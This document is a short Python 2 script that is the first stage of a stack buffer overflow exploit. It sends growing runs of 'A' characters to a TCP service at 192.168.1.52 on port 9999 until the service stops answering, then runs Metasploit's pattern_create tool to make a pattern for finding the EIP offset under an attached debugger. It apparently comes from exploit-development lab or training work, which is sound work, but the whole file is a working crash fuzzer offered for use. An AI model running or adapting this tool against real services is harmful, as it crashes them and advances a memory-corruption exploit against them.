#!/usr/bin/python2
import socket
import commands
import os
import sys

def spiking():

    buffer=["A"]
    counter = 100
    timeout=0
    while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter = counter + 200
    for string in buffer:
        try:
            timeout += 1
            print("Spiking with %s bytes" % len(string))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect = s.connect(('192.168.1.52',9999))
            s.recv(1024)
            s.send(string + '\r\n')
            s.close()
            if timeout > 20:
                break
        except:
            break

    return len(string)


def yes_or_no(question):
    reply = str(raw_input(question+' (y/n): ')).lower().strip()
    print(reply)
    if reply == 'y':
        return True
    if reply == 'n':
        return False
    else:
        return yes_or_no(question)


def main():

    code_len = spiking()

    if os.path.isfile('/opt/metasploit/tools/exploit/pattern_create.rb') is True:
        pattern_tool = '/opt/metasploit/tools/exploit/pattern_create.rb'
    elif os.path.isfile('/usr/share/metasploit-framework/tools/pattern_create.rb') is True:
        pattern_tool = '/usr/share/metasploit-framework/tools/pattern_create.rb'
    else:
        print('Missing pattern_create tool')
        sys.exit(1)

    print('Generating pattern')
    pattern = commands.getoutput("%s -l %s" % (pattern_tool, code_len))

    yes_or_no("Make sure application is now running again and debugger is attached to collect eip address on next crash")
    print(pattern)



if __name__ == '__main__':
    main()